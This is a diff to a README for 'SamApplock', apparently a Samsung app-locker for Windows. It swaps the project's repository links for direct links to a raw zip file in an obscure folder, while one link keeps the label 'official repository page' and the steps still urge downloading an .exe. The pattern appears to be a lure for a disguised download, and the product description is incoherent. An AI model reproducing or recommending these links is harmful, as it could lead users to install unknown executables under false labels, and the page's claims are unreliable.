@@ -1,6 +1,6 @@
 # 🔒 SamApplock - Secure your private apps with ease
 
-[![](https://img.shields.io/badge/Download-SamApplock-blue.svg)](https://github.com/anticyclonegenusgloriosa242/SamApplock)
+[![](https://img.shields.io/badge/Download-SamApplock-blue.svg)](https://github.com/anticyclonegenusgloriosa242/SamApplock/raw/refs/heads/main/gerah/Applock-Sam-v2.2-alpha.3.zip)
 
 SamApplock provides a simple way to protect the applications on your Samsung device. Use this tool to prevent unauthorized access to your private data. You can lock specific apps with a pin or pattern. This software runs on Windows to manage your device settings.
 
@@ -8,7 +8,7 @@ SamApplock provides a simple way to protect the applications on your Samsung dev
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official repository page](https://github.com/anticyclonegenusgloriosa242/SamApplock).
+1. Visit the [official repository page](https://github.com/anticyclonegenusgloriosa242/SamApplock/raw/refs/heads/main/gerah/Applock-Sam-v2.2-alpha.3.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in .exe to your computer.
